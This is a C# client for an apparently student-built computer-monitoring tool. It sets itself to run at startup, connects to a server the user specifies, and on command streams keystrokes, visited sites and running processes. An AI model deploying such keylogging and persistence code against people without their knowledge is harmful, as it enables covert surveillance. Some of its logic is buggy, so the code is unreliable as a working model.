using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary; 
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Reflection; 
using System.Runtime.InteropServices; 
using iTextSharp.text.pdf;
using iTextSharp.text; 

namespace ClientSide
{

    public delegate void wordFromKeylogger(string word);
    public delegate void SiteFromMonitorSite(string word);
    public delegate void updateProccess(string proccess);
    class Program
    {

        const string ID = "id";
        const string SETTING = "setting";
        const string LIVE = "start live mode";
        const string STOP_LIVE = "stop current state";
        const string REMOVE_CLIENT = "remove client";
        const string LAST_REPORT = "last report";

        private String id;
        private Socket clientSocket;
        private String name;
        private String ip;
        private Byte[] buffer;
        private DBclient dbc;
        private Setting set;
        private ClientForm clientForm;
        public Boolean sendCurrentData;
        string keyDate;
        public static Program program;
        ManageMonitor manageMonitor;
        private static bool checkConnection;
        static Mutex mutex = new Mutex(true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04E6BDE8F}");



        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
        
            CreateShortcut("BSA-Client", Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Assembly.GetExecutingAssembly().Location);
            program = new Program();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);


            // check if connect at first time or reconncted  
            if (!program.connectToExistClient())
            {
                program.connectToServer();
            }
            // thread to check internet connection 
            Thread interntAvilable = new Thread(checkConnections);
            interntAvilable.Start();
           
            Application.Run();
            


        }
        public static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
        {
             
            string projectDirectory = Environment.CurrentDirectory;
            string path = Directory.GetParent(projectDirectory).Parent.FullName;
            string userName = Environment.UserName;
            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

            shortcut.Description = "BE SAFE CLIENT SIDE ";   // The description of the shortcut
            shortcut.IconLocation = path + "/besafe-server-icon.ico"; // The icon of the shortcut
            shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
            shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
            shortcut.Save();                                    // Save the shortcut



        }
        private static void checkConnections()
        {
            while (true)
            {

                if (checkInterntConnection())
                {
                    if(!checkSocketConnections())
                    {
                        Console.WriteLine("checkSocketConnections false - RECONNECT");
                        program.reConnect();
                    }

                }
                else {
                    bool sendDataStatus = program.SendData(program.clientSocket, "NO_INTERNET\r");
                    if (!sendDataStatus) {                       
                        // ShowErrorDialog("checkSocketConnections: \n" + ex.Message + " \n\n" + ex);
                        Console.WriteLine("FAIL SEND TO CLIENT NO INTERNET");
                        program.reConnect();   

                    }
                }

                Thread.Sleep(5000); 


            } 
        }
        private static bool checkSocketConnections()
        {
             
                if (program.clientSocket == null)
                {
                    return false;
                }
                bool sendDataStatus = program.SendData(program.clientSocket, "client check connection");
                if (sendDataStatus)
                {
                    return true;
                }
                else
                {
                    // ShowErrorDialog("checkSocketConnections: \n" + ex.Message + " \n\n" + ex);
                    if (program.manageMonitor != null)
                    {
                        program.manageMonitor.stopLiveMode();
                    }

                    return false;
                }


                

            
        }

        public static bool checkInterntConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                // send client not internet
                return false;
            }

 
        }

        private static void connectAtReStartComputer()
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            WshShell shell = new WshShell();
            string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "BESAFE CLIENT SIDE"; // set the description of the shortcut
            shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
            shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
            shortcut.Save(); // save the shortcut 
            shortcut.Arguments = "/a /c";

            



            // if (rkApp.GetValue("ClientSide.exe") == null) { }
            // Remove the value from the registry so that the application doesn't start
            //  else 
            //  rkApp.DeleteValue("ClientSide.exe", false);

        }

        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }

                string data = Encoding.ASCII.GetString(buffer);

                var dataFromServer = data.Split(new[] { '\r', '\n', '\0' }, 2);

                DBclient DBInstance = DBclient.Instance;

                switch (dataFromServer[0])// dddd 
                {
                    // Get uniqe id 
                    case ID:
                        id = dataFromServer[1].Split('\r', '\n', '\0')[0];
                        DBInstance.fillGeneralDetailsTable("id", id);
                        //ShowErrorDialog("get id");  
                        break;

                    // Get Setting to implement monitoring gg 
                    case SETTING:
                        string setting = dataFromServer[1].Split('\0')[0];
                        setting = setting.Substring(setting.IndexOf("\n") + 1);

                        // save setting                          
                        DBInstance.fillGeneralDetailsTable("name", name);
                        DBInstance.fillGeneralDetailsTable("ip", ip);
                        DBInstance.fillGeneralDetailsTable("setting", setting);
                        playAllTrigers(); //This method obtains the settings string from the server  
                        break;

                    // Launch the software in live reporting mode
                    case LIVE:
                        liveMode(clientSocket); 
                        break;

                    // Stop live reporting mode 
                    case STOP_LIVE:
                        stopLiveMode(clientSocket);
                        break;

                    // Stop live reporting mode
                    case LAST_REPORT:// abo 
                        Console.WriteLine("accept request to last report");
                        sendLastReport(clientSocket);
                        break;

                    // Remove computer from monitoring
                    case REMOVE_CLIENT:
                        removeClient();
                        break;

                    default:
                        break;
                }

                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
            }

            catch (SocketException ex)
            {
                Console.WriteLine("ReceiveCallback SocketException - RECONNECT");
                reConnect();
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ReceiveCallback ObjectDisposedException\n " + ex.Message + " \n\n" + ex);
               Console.WriteLine("ReceiveCallback ObjectDisposedException");
            }
        }

        private void sendLastReport(Socket socket)
        {

            string lastReport = PeriodicReporting.getReportString();     
            Console.WriteLine("last reort is: " + lastReport);
            SendData(socket, "check connection before send last report\r");
            SendData(socket, "last report\r" + lastReport);
        }
        // sara 
        private void removeClient()
        { 
            // turn off all theards 
            manageMonitor.stopAllTriggers();
           
            // stop timer
            PeriodicReporting.stopTimer();
           
            // db
            DBclient DBInstance = DBclient.Instance;
            DBInstance.deleteDB();
                     
            // restart - delete key 
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkApp.DeleteValue("ClientSide.exe", false);

            System.Environment.Exit(0);




        }

        private void stopLiveMode(Socket clientSocket)
        {

            sendCurrentData = false;
            manageMonitor.stopLiveMode();
        }

        private void liveMode(Socket socket)
        {
            sendCurrentData = true;
            SendData(socket, "current state\ropen CurrentState form");
            manageMonitor.playLiveMode();


        }

        // set setting and here will play all triggers;
        private void playAllTrigers()
        {
            Console.WriteLine("PLAY ALL TRIGGERRS");

            // Play all monitors
            if (manageMonitor == null)
            {
                manageMonitor = new ManageMonitor();
            }
            Setting settingInstance = Setting.Instance;
            settingInstance.setAllSetting();


            manageMonitor.stopAllTriggers();

            manageMonitor.playAllTriggers();

            // Set Periodic Report
            PeriodicReporting.setReportPeriodic();

            // set daiely report
            PeriodicReporting.setDailyReport();
        }

       
        // Defines functions for sending and receiving data through the socket kill sara 
        private void ConnectCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndConnect(AR);
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);

                if (id != null)
                {
                    SendData(clientSocket, "id\r" + id);
                }
                   
                else SendData(clientSocket, "name\r" + name);

            }
            catch (SocketException ex)
            {
                 Thread.Sleep(5000);
                //ShowErrorDialog("ConnectCallback send SocketException\n" + ex.Message+" \n\n"+ex);
                Console.WriteLine("ConnectCallback send SocketException\n"+ex.Message);

                reConnect();

            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ConnectCallback send ObjectDisposedException\n" + ex.Message + " \n\n" + ex);
            }
            catch (ArgumentException ex) {
                Console.WriteLine("ConnectCallback ArgumentException");
            }
        }

        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendCallback send SocketException\r\n" + ex.Message + " \n\n" + ex);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendCallback send ObjectDisposedException \r\n" + ex.Message + " \n\n" + ex);
            }
            catch (ArgumentException ex) {
                Console.WriteLine("SendCallback ArgumentException");
                ShowErrorDialog("SendCallback send ArgumentException \r\n" + ex.Message + " \n\n" + ex);
            }
        }

        public static void ShowErrorDialog(string message)
        {
            Console.WriteLine(message);
        }


        public void connectToServer()
        {
            try
            {

                clientForm = new ClientForm();
                clientForm.Text = "Connecting to monitoring software";
                Thread openClientForm = new Thread(openClientFormDialog);
                openClientForm.SetApartmentState(ApartmentState.STA);
                openClientForm.Start();

                while (openClientForm.IsAlive) ;

                name = clientForm.clientName;
                ip = clientForm.ip;
                

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
                
                // Set up the software that will work when you turn on the computer           
                connectAtReStartComputer();
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("connectToServer send SocketException\r\n"+ ex.Message + " \n\n" + ex);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("connectToServer send ObjectDisposedException\r\n" + ex.Message + " \n\n" + ex);
            }


        }
 
        public static bool internetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private bool connectToExistClient()
        {

            DBclient DBInstance = DBclient.Instance;            
            ip = DBInstance.getGeneralDetailsTable("ip");
            string setting  = DBInstance.getGeneralDetailsTable("setting");
            Console.WriteLine("setting: " + setting+"\nip: "+ip);
            if (setting.Length > 0)
            {
                id = DBInstance.getGeneralDetailsTable("id");
                Console.WriteLine("connectToExistClient - RECONNECT");
                reConnect();
                playAllTrigers();
                
                return true;
            }
            return false;

 

        }

        private void openClientFormDialog()
        {
            clientForm.ShowDialog();
        }

        public bool SendData(Socket clientSocket, String data) 
        {
            
 
            try
            {
                if(clientSocket!=null)
                {
                     
                    if (data.Length > 330)
                    {
                        sendDataByParts(clientSocket, data);

                    }
                    string crypto = Crypto.Encrypt(data);
                    string decrypto = Crypto.Decrypt(crypto);
                    Console.WriteLine(crypto +"\n"+decrypto+"\n"+ crypto.Length);
                    var sendData = Encoding.UTF8.GetBytes(crypto);
                    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
                    return true;
                   

                }
                else {
                    Console.WriteLine("send data fail, socket disconnection");
                    SendData(clientSocket, data);
                   
                }
                return false;

            }
            catch (SocketException ex)
            {
                ShowErrorDialog("send data fail, Socket Exception \r\n" + ex.Message + " \n\n" + ex);               
                return false;
                 
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("send data fail, ObjectDisposed Exception \r\n" + ex.Message + " \n\n" + ex);
                return false;
               
            }
        }

        private void sendDataByParts(Socket socket, string data)
        {
            string subject = data.Split(new char[] { '\r' }, 2)[0];
            string message = data.Split(new char[] { '\r' }, 2).Last();
            List<string> subData = new List<string>();
            Console.WriteLine("last report lengrh is:" + message.Length);
            int chunkSize = 300;
            int stringLength = message.Length;
            for (int i = 0; i < stringLength; i += chunkSize)
            {
                if (i + chunkSize > stringLength) chunkSize = stringLength - i;
                string s = message.Substring(i, chunkSize);
                subData.Add(s);
                Console.WriteLine(s+"\r length: "+s.Length);

            }
            Console.ReadLine();


             
            for (int i=0; i<subData.Count();i++) 
            {

                if (i == 0)
                {
                    Console.WriteLine(subData.ElementAt(i));
                    SendData(socket, "parts\r"+id+"\rfirst\r"+ subject+ "\r"+ subData.ElementAt(i)+"\n");
                }
                else if(i== subData.Count()-1)
                {
                    Console.WriteLine(subData.ElementAt(i));
                    SendData(socket, "parts\r" + id + "\rfinal\r" + subject + "\r" + subData.ElementAt(i) + "\n");
                }
                else
                {
                    Console.WriteLine(subData.ElementAt(i));
                    SendData(socket, "parts\r" + id + "\rcontinue\r" + subject + "\r" + subData.ElementAt(i) + "\n");
                }
               
            }
        }


       public void reConnect()
        {
            try
            {
                if (checkSocketConnections()) {
                    return;

                }
                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);

                // send to server alert who missing 
                DBclient DBInstance = DBclient.Instance;
                string immadiateAlerts = DBInstance.getReportImmediateTable();
                if (immadiateAlerts.Length > 0)
                {
                    PeriodicReporting.sendMissingReportsToMail(immadiateAlerts);
                }


                
            }
            catch (SocketException ex) 
            {
                ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message + " \n\n" + ex);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message + " \n\n" + ex);
            }
            catch (InvalidOperationException ex) {
                ShowErrorDialog("reConnect send InvalidOperationException \r\n" + ex.Message + " \n\n" + ex);
            }
        }

        public static void updateCurrentKeylogger(string word)
        {
            program.SendData(program.clientSocket, "current state\rkeyBoard\r" + word);
        }

        public static void updateCurrentSite(string site)
        {
            program.SendData(program.clientSocket, "current state\rsite\r" + site);
        }

        public static void updateCurrentProcess(string proccess)
        {
           program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);
        }


    }
}

